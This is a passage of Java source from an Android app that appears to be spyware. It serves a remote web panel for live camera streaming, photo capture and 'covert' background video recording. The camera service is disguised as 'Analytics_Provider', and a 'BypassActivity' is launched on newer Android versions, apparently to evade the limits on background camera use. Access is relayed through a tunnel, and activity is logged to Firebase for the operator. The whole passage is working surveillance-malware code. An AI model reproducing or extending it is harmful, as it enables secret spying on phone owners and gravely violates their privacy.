        html.append("<div style=\"display: flex; justify-content: space-between; width: 100%; height: 20px; font-size: 0.5rem; color: #777; font-family: monospace; letter-spacing: 0; margin-top: 8px; position: relative;\">");
        html.append("<span style=\"width: 50px; text-align: left;\">ULTRA LOW</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">VL</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">L</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">M</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">H</span>");
        html.append("<span style=\"width: 50px; text-align: right;\">VERY HIGH</span>");
        html.append("</div></div></div>");

        html.append("<div style=\"margin-bottom: 15px; text-align: center; max-width: 450px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append("<div style=\"color: #888; margin-bottom: 10px; font-size: 0.7rem; font-family:monospace; text-align: center;\">CAMERAS</div>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; width: 100%;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "border-color: #00f2ff; color: #00f2ff; background: rgba(0, 242, 255, 0.15);" : "border-color: rgba(255,255,255,0.2); color: #888; background: rgba(255, 255, 255, 0.05);";
            html.append("<button onclick=\"switchCam('").append(cam.id).append("')\" ");
            html.append("class=\"btn-small\" style=\"padding: 10px 1px; font-size: 0.7rem; ").append(selected).append(" flex: 1; min-width: 0; margin:0; text-decoration:none; text-align:center; cursor:pointer;\">");
            html.append(cam.facing.toUpperCase());
            html.append("</button>");
        }
        html.append("</div></div>");

        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 15px; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
        html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color: #f39c12; color: #f39c12; background: rgba(243, 156, 18, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#8635; ROTATE</button>");
        html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#128247; SNAP</button>");
        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; START_COVERT_RECORDING</button>");
        html.append("<a href=\"/camera\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 10px; text-decoration: none; text-align: center; margin:0; width:100%; min-width:0;\">&#8592; BACK</a>");
        html.append("</div>");
        html.append("</div>");

        html.append("<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var streamFps = ").append(fps).append(";");
        html.append("var refreshRate = ").append(1000/fps).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");
        html.append("var currentRotation = 0;");

        html.append("function rotateStream() {");
        html.append("  currentRotation = (currentRotation + 90) % 360;");
        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
        html.append("}");

        html.append("const resOptions = ['ultra_low', 'very_low', 'low', 'medium', 'high', 'very_high'];");
        html.append("function stepQuality(delta) {");
        html.append("  const s = document.getElementById('quality-slider');");
        html.append("  let val = parseInt(s.value) + delta;");
        html.append("  if(val < 0) val = 0; if(val > 5) val = 5;");
        html.append("  s.value = val; applyQuality(val);");
        html.append("}");
        html.append("function applyQuality(val) {");
        html.append("  localStorage.setItem('cam_scroll', window.scrollY);");
        html.append("  window.location.href = '/camera/live?cam=' + camId + '&res=' + resOptions[val];");
        html.append("}");

        html.append("async function switchCam(newCamId) {");
        html.append("  if (newCamId === camId) return;");
        html.append("  const currentScroll = window.scrollY;");
        html.append("  streamActive = false;");
        html.append("  document.getElementById('loading').style.display = 'block';");
        html.append("  document.getElementById('loading').innerText = 'RELEASING_HARDWARE...';");
        html.append("  await fetch('/camera/stop-stream');");
        html.append("  const currentRes = resOptions[document.getElementById('quality-slider').value];");
        html.append("  const nextUrl = '/camera/live?cam=' + newCamId + '&res=' + currentRes;");
        html.append("  localStorage.setItem('cam_scroll', currentScroll);");
        html.append("  setTimeout(() => { window.location.href = nextUrl; }, 300);");
        html.append("}");

        html.append("let streamActive = true;");
        html.append("function startStream() {");
        html.append("  const img = document.getElementById('stream');");
        html.append("  if (img) img.style.display = 'none';");
        html.append("  if (loadingDiv) { loadingDiv.style.display = 'block'; loadingDiv.innerText = 'INITIALIZING_CAMERA...'; }");
        html.append("  streamActive = true;");
        html.append("  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  let isTunnel = window.location.hostname.includes('onrender.com') || window.location.pathname.startsWith('/proxy');");
        html.append("  if (isTunnel) {");
        html.append("    let pollCount = 0;");
        html.append("    if (window.pollFrame) clearInterval(window.pollFrame);");
        html.append("    window.pollFrame = setInterval(() => {");
        html.append("      pollCount++;");
        html.append("      fetch('/camera/frame?t=' + Date.now())");
        html.append("        .then(r => r.blob())");
        html.append("        .then(blob => {");
        html.append("          if (blob && blob.size > 100) {");
        html.append("            clearInterval(window.pollFrame);");
        html.append("            const initialUrl = URL.createObjectURL(blob);");
        html.append("            if (img) { img.src = initialUrl; img.style.display = 'block'; img.dataset.oldUrl = initialUrl; }");
        html.append("            if (loadingDiv) loadingDiv.style.display = 'none';");
        html.append("            fetchNextFrame();");
        html.append("          }");
        html.append("        })");
        html.append("        .catch(() => {});");
        html.append("      if (pollCount > 35) {");
        html.append("        clearInterval(window.pollFrame);");
        html.append("        handleStreamError();");
        html.append("      }");
        html.append("    }, 500);");
        html.append("  } else {");
        html.append("    setTimeout(() => {");
        html.append("      if (img) {");
        html.append("        img.src = '/camera/stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality + '&t=' + Date.now();");
        html.append("        img.onload = () => { if (loadingDiv) loadingDiv.style.display = 'none'; img.style.display = 'block'; };");
        html.append("      }");
        html.append("    }, 1000);");
        html.append("  }");
        html.append("}");

        html.append("function fetchNextFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  const img = document.getElementById('stream');");
        html.append("  if (!img) return;");
        html.append("  fetch('/camera/frame?t=' + Date.now())");
        html.append("    .then(r => r.blob())");
        html.append("    .then(blob => {");
        html.append("      if (blob && blob.size > 100) {");
        html.append("        const newUrl = URL.createObjectURL(blob);");
        html.append("        if (img.dataset.oldUrl) URL.revokeObjectURL(img.dataset.oldUrl);");
        html.append("        img.src = newUrl;");
        html.append("        img.dataset.oldUrl = newUrl;");
        html.append("        if (loadingDiv) loadingDiv.style.display = 'none';");
        html.append("        img.style.display = 'block';");
        html.append("      }");
        html.append("      if (streamActive) setTimeout(fetchNextFrame, 80);");
        html.append("    })");
        html.append("    .catch(() => {");
        html.append("      if (streamActive) setTimeout(fetchNextFrame, 300);");
        html.append("    });");
        html.append("}");

        html.append("function streamLoaded() { /* Handled by inline onload */ }");

        html.append("function handleStreamError() {");
        html.append("  loadingDiv.innerHTML = 'Uplink Error. <a href=\"javascript:startStream()\" style=\"color:var(--neon-cyan)\">RETRY</a>';");
        html.append("}");

        html.append("function refreshFrame() { /* Not needed for MJPEG */ }");

        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; START_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.05)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.2)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    const ind = document.getElementById('live-indicator');");
        html.append("    const dot = document.getElementById('indicator-dot');");
        html.append("    const txt = document.getElementById('indicator-text');");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)';");
        html.append("      isRecording = true;");
        html.append("    } else {");
        html.append("      document.getElementById('rec-indicator').style.display = 'none';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9679; START_COVERT_RECORDING';");
        html.append("      ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        html.append("      isRecording = false;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");
        html.append("setInterval(checkStatus, 2000);");

        html.append("window.onbeforeunload = function() { streamActive = false; };");
        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>"); 
        html.append("</div>"); 

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        if (!Analytics_Provider.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            int width = 640, height = 480, quality = 40;
            try {
                if(params.containsKey("width")) width = Integer.parseInt(params.get("width"));
                if(params.containsKey("height")) height = Integer.parseInt(params.get("height"));
                if(params.containsKey("quality")) quality = Integer.parseInt(params.get("quality"));
            } catch(Exception ignored) {}
            
            startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);
            
            // Wait for hardware to warm up
            long startTime = System.currentTimeMillis();
            while (!Analytics_Provider.isCurrentlyStreaming() && (System.currentTimeMillis() - startTime < 5000)) {
                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }
        }

        return server.newChunkedResponseProxy(Response.Status.OK, "multipart/x-mixed-replace; boundary=--frame", new java.io.InputStream() {
            private byte[] currentData = null;
            private int currentPos = 0;
            private int errorCount = 0;

            @Override
            public int read() throws java.io.IOException {
                if (currentData == null || currentPos >= currentData.length) {
                    if (!fetchNextChunk()) return -1;
                }
                return currentData[currentPos++] & 0xFF;
            }

            @Override
            public int read(byte[] b, int off, int len) throws java.io.IOException {
                if (currentData == null || currentPos >= currentData.length) {
                    if (!fetchNextChunk()) return -1;
                }
                int available = currentData.length - currentPos;
                int toCopy = Math.min(len, available);
                System.arraycopy(currentData, currentPos, b, off, toCopy);
                currentPos += toCopy;
                return toCopy;
            }

            private boolean fetchNextChunk() {
                // If initializing, wait up to 3 seconds for first frame
                if (Analytics_Provider.isInitializing()) {
                   try { Thread.sleep(500); } catch (Exception ignored) {}
                }

                if (!Analytics_Provider.isCurrentlyStreaming() && !Analytics_Provider.isInitializing()) {
                    return false;
                }

                byte[] frame = Analytics_Provider.getNextFrame(4000);
                if (frame == null) {
                    errorCount++;
                    return errorCount < 3; // Allow up to 3 missed frames before closing
                }

                errorCount = 0;
                try {
                    String header = "\r\n--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " + frame.length + "\r\n\r\n";
                    byte[] headerBytes = header.getBytes("UTF-8");
                    currentData = new byte[headerBytes.length + frame.length];
                    System.arraycopy(headerBytes, 0, currentData, 0, headerBytes.length);
                    System.arraycopy(frame, 0, currentData, headerBytes.length, frame.length);
                    currentPos = 0;
                    return true;
                } catch (Exception e) { return false; }
            }
        });
    }

    private Response serveSingleFrame() {
        byte[] frame = Analytics_Provider.getNextFrame(2000);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        FirebaseConfig.logActivity("OPTICS_UPLINK: Live stream started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null) width = Integer.parseInt(widthStr);
            if (heightStr != null) height = Integer.parseInt(heightStr);
            if (qualityStr != null) quality = Integer.parseInt(qualityStr);
        } catch (Exception ignored) {}

        if (Build.VERSION.SDK_INT >= 34) {
            try {
                Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                context.startActivity(bypass);
                Thread.sleep(200);
            } catch (Exception ignored) {}
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("success", true);
            result.put("message", "Stream started");
            result.put("camera", (camId != null ? camId : "0"));
        } catch (Exception ignored) {}
        return newResponse(Response.Status.OK, "application/json", result.toString());
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_START_STREAM);
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_STOP_STREAM);
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        FirebaseConfig.logActivity("OPTICS_UPLINK: Background video recording started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null) width = Integer.parseInt(widthStr);
            if (heightStr != null) height = Integer.parseInt(heightStr);
        } catch (Exception e) {}

        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_START_RECORDING);
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        FirebaseConfig.logActivity("OPTICS_TERMINATED: Background recording saved");
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_STOP_RECORDING);
        context.startService(intent);

        String videoPath = Analytics_Provider.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response terminateAllCaptures() {
        Intent cameraStop = new Intent(context, Analytics_Provider.class);
        cameraStop.setAction(Constants.ACTION_STOP_OPTICS);
        context.startService(cameraStop);
        
        Intent audioStop = new Intent(context, MediaFrameworkService.class);
        audioStop.setAction("STOP");
        context.startService(audioStop);
        
        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Force-terminated all active hardware captures (Privacy Reset)");
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"All captures terminated\"}");
    }

    private Response serveCameraStatus() {
        boolean streaming = Analytics_Provider.isCurrentlyStreaming();
        boolean recording = Analytics_Provider.isCurrentlyRecording();
        String currentCamera = Analytics_Provider.getCurrentCameraId();
        long duration = Analytics_Provider.getRecordingDuration();
        String videoPath = Analytics_Provider.getCurrentVideoPath();
        String lastFinished = Analytics_Provider.getLastFinishedVideoPath();

        boolean nightMode = Analytics_Provider.isNightModeEnabled(context);

        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("streaming", streaming);
            result.put("recording", recording);
            result.put("camera", currentCamera != null ? currentCamera : "0");
            result.put("duration", duration);
            result.put("nightMode", nightMode);
            result.put("videoPath", videoPath != null ? videoPath : org.json.JSONObject.NULL);
            
            if (lastFinished != null) {
                // Convert absolute path to relative storage path for /download/ endpoint
                String storageBase = Environment.getExternalStorageDirectory().getAbsolutePath();
                if (lastFinished.startsWith(storageBase)) {
                    String relative = lastFinished.substring(storageBase.length());
                    if (relative.startsWith("/")) relative = relative.substring(1);
                    result.put("last_finished", relative);
                }
            }
        } catch (Exception ignored) {}
        
        return newResponse(Response.Status.OK, "application/json", result.toString());
    }

    private Response toggleNightMode() {
        boolean current = Analytics_Provider.isNightModeEnabled(context);
        boolean newValue = !current;
        
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putBoolean("night_mode", newValue).commit();
        
        FirebaseConfig.logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
        
        Analytics_Provider service = Analytics_Provider.getInstance();
        if (service != null) {
            service.setNightMode(newValue);
        }
        
        return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + newValue + "}");
    }
}
